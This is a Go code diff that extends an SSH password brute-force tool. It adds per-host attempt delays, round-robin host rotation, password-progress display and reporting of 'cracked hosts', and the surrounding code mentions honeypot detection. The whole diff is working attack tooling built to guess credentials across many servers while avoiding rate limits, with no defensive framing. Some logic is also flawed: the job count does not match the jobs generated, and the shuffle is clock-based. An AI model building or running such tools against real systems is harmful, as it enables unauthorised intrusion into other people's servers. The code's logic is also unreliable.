@@ -39,6 +39,17 @@ type WorkerPool struct {
 	failedIPsMutex sync.RWMutex
 	connSemaphores map[string]chan struct{} // Per-target connection limiters
 	connSemMutex   sync.Mutex
+
+	// Password rotation tracking
+	currentPassword  string
+	passwordProgress int
+	totalPasswords   int
+	passwordMutex    sync.RWMutex
+
+	// Host rotation tracking
+	lastHostAttempt map[string]time.Time
+	hostDelay       time.Duration
+	hostMutex       sync.RWMutex
 }
 
 // NewWorkerPool creates a new worker pool
@@ -59,6 +70,8 @@ func NewWorkerPool(workers int, limits ConnectionLimits) *WorkerPool {
 		limits:                limits,
 		failedIPs:             make(map[string]*FailedIPInfo),
 		connSemaphores:        make(map[string]chan struct{}),
+		lastHostAttempt:       make(map[string]time.Time),
+		hostDelay:             2 * time.Second, // 2 second delay between attempts to same host
 	}
 }
 
@@ -131,6 +144,11 @@ func (wp *WorkerPool) worker(id int) {
 			// Release connection slot
 			wp.releaseConnection(job.Target)
 
+			// Update host attempt tracking
+			wp.hostMutex.Lock()
+			wp.lastHostAttempt[job.Target] = time.Now()
+			wp.hostMutex.Unlock()
+
 			// Record failed attempts
 			if !success && err != nil {
 				wp.recordFailedIP(job.Target, err.Error())
@@ -160,6 +178,12 @@ func (wp *WorkerPool) BruteForceSSH(targets, users, passwords []string) {
 	// Store targets for interval checking
 	wp.monitoredTargets = targets
 
+	// Initialize password rotation tracking
+	wp.passwordMutex.Lock()
+	wp.totalPasswords = len(passwords)
+	wp.passwordProgress = 0
+	wp.passwordMutex.Unlock()
+
 	// Start workers
 	wp.StartWorkers()
 
@@ -169,35 +193,14 @@ func (wp *WorkerPool) BruteForceSSH(targets, users, passwords []string) {
 	// Start interval honeypot checker (only if honeypot detection is enabled)
 	// This will be controlled by the main function
 
-	// Generate and queue jobs
+	// Generate and queue jobs with proper host rotation
 	totalJobs := 0
-	for _, target := range targets {
-		// Parse target for host:port
-		addr := target
-		port := "22"
-		if strings.Contains(target, ":") {
-			parts := strings.Split(target, ":")
-			addr = parts[0]
-			port = parts[1]
-		}
 
-		for _, user := range users {
-			for _, pass := range passwords {
-				job := Job{
-					Target:   fmt.Sprintf("%s:%s", addr, port),
-					Username: user,
-					Password: pass,
-				}
+	// Create a proper host rotation system
+	wp.startHostRotationJobGenerator(targets, users, passwords)
 
-				select {
-				case wp.jobQueue <- job:
-					totalJobs++
-				case <-wp.ctx.Done():
-					return
-				}
-			}
-		}
-	}
+	// Count total jobs for progress tracking
+	totalJobs = len(targets) * len(users) * len(passwords)
 
 	wp.totalJobs = totalJobs
 	fmt.Printf("Queued %d jobs for processing...\n", totalJobs)
@@ -250,14 +253,21 @@ func (wp *WorkerPool) updateProgress() {
 			total := wp.totalJobs
 			wp.mu.Unlock()
 
+			wp.passwordMutex.RLock()
+			currentPass := wp.currentPassword
+			passProgress := wp.passwordProgress
+			totalPass := wp.totalPasswords
+			wp.passwordMutex.RUnlock()
+
 			if completed < total {
 				elapsed := time.Since(wp.startTime)
 				rate := float64(completed) / elapsed.Seconds()
 				remaining := time.Duration(float64(total-completed)/rate) * time.Second
 
-				// Clear line and print progress
-				fmt.Printf("\r\033[KProgress: %d/%d (%.1f%%) | Success: %d | Rate: %.1f/s | ETA: %v",
-					completed, total, float64(completed)/float64(total)*100, success, rate, remaining.Round(time.Second))
+				// Clear line and print progress with password rotation info
+				fmt.Printf("\r\033[KProgress: %d/%d (%.1f%%) | Success: %d | Rate: %.1f/s | ETA: %v | Password: %d/%d ('%s')",
+					completed, total, float64(completed)/float64(total)*100, success, rate, remaining.Round(time.Second),
+					passProgress, totalPass, currentPass)
 			}
 		case <-wp.ctx.Done():
 			return
@@ -279,6 +289,11 @@ func (wp *WorkerPool) printResults() {
 	fmt.Printf("Failed attempts: %d\n", wp.completedJobs-wp.successCount)
 	fmt.Printf("Time elapsed: %v\n", elapsed.Round(time.Second))
 	fmt.Printf("Average rate: %.1f attempts/second\n", rate)
+
+	// Password rotation statistics
+	wp.passwordMutex.RLock()
+	fmt.Printf("Password rotation: %d/%d passwords tried\n", wp.passwordProgress, wp.totalPasswords)
+	wp.passwordMutex.RUnlock()
 
 	// Print export information
 	if wp.successCount > 0 {
@@ -547,4 +562,110 @@ func (wp *WorkerPool) displayCrackedHosts() {
 
 	fmt.Printf("\nCracked hosts:\n")
 	fmt.Printf("%s", string(content))
+}
+
+// shuffleJobs randomizes the order of jobs to avoid hitting same host repeatedly
+func (wp *WorkerPool) shuffleJobs(jobs []Job) {
+	// Use a simple Fisher-Yates shuffle
+	for i := len(jobs) - 1; i > 0; i-- {
+		j := int(time.Now().UnixNano()) % (i + 1)
+		jobs[i], jobs[j] = jobs[j], jobs[i]
+	}
+}
+
+// SetHostDelay sets the delay between attempts to the same host
+func (wp *WorkerPool) SetHostDelay(delay time.Duration) {
+	wp.hostMutex.Lock()
+	wp.hostDelay = delay
+	wp.hostMutex.Unlock()
+}
+
+// startHostRotationJobGenerator starts a goroutine that generates jobs with proper host rotation
+func (wp *WorkerPool) startHostRotationJobGenerator(targets, users, passwords []string) {
+	go func() {
+		defer close(wp.jobQueue)
+
+		// Create a round-robin system for true host rotation
+		hostIndex := 0
+		userIndex := 0
+		passIndex := 0
+		jobCount := 0
+
+		// Parse targets once
+		parsedTargets := make([]string, len(targets))
+		for i, target := range targets {
+			addr := target
+			port := "22"
+			if strings.Contains(target, ":") {
+				parts := strings.Split(target, ":")
+				addr = parts[0]
+				port = parts[1]
+			}
+			parsedTargets[i] = fmt.Sprintf("%s:%s", addr, port)
+		}
+
+		// Generate jobs with true host rotation
+		for passIndex < len(passwords) {
+			// Try to find a host that hasn't been hit recently
+			attempts := 0
+			for attempts < len(parsedTargets) {
+				target := parsedTargets[hostIndex]
+
+				// Check if we can hit this host
+				wp.hostMutex.Lock()
+				lastAttempt, exists := wp.lastHostAttempt[target]
+				canHit := !exists || time.Since(lastAttempt) >= wp.hostDelay
+				wp.hostMutex.Unlock()
+
+				if canHit {
+					// Create job for this host
+					job := Job{
+						Target:   target,
+						Username: users[userIndex],
+						Password: passwords[passIndex],
+					}
+
+					// Update host attempt time
+					wp.hostMutex.Lock()
+					wp.lastHostAttempt[target] = time.Now()
+					wp.hostMutex.Unlock()
+
+					// Update progress
+					wp.passwordMutex.Lock()
+					wp.currentPassword = passwords[passIndex]
+					wp.passwordProgress = passIndex + 1
+					wp.passwordMutex.Unlock()
+
+					// Queue the job
+					select {
+					case wp.jobQueue <- job:
+						jobCount++
+					case <-wp.ctx.Done():
+						return
+					}
+
+					// Move to next user
+					userIndex++
+					if userIndex >= len(users) {
+						userIndex = 0
+						// Move to next password
+						passIndex++
+					}
+
+					// Move to next host
+					hostIndex = (hostIndex + 1) % len(parsedTargets)
+					break
+				} else {
+					// This host was hit too recently, try next one
+					hostIndex = (hostIndex + 1) % len(parsedTargets)
+					attempts++
+				}
+			}
+
+			// If we couldn't find any available host, wait a bit
+			if attempts >= len(parsedTargets) {
+				time.Sleep(100 * time.Millisecond)
+			}
+		}
+	}()
 }
